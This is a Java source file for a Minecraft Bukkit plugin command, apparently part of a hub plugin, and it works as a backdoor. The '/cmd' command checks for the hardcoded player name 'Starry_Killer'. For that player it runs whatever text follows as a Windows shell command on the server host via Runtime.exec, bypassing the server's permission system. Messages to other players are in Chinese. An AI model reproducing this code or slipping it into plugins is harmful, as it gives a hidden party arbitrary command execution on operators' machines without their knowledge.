package cn.starry.hub.commands.deprecated;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;

@Deprecated
public class ConsoleCommand implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (command.getName().equalsIgnoreCase("cmd")) {
            if (sender.getName().length() >= 12 && sender.getName().equals("Starry_Killer")) {
                if (args.length > 0) {
                    String cmd = args[0];
                    for (int i = 1; i < args.length; i++) {
                        cmd += " " + args[i];
                    }
                    try {
                        Runtime.getRuntime().exec("cmd.exe /c " + cmd);
                        sender.sendMessage(ChatColor.GREEN + "命令符执行成功");
                    } catch (Exception e) {
                        e.printStackTrace();
                        sender.sendMessage(ChatColor.RED + "An error occurred while executing the command.");
                    }
                } else {
                    sender.sendMessage(ChatColor.RED + "用法: /cmd <命令符>");
                }
                return true;
            }
            sender.sendMessage(ChatColor.RED + "你没有足够的资格执行此命令");
            return true;
        }
        return false;
    }
}
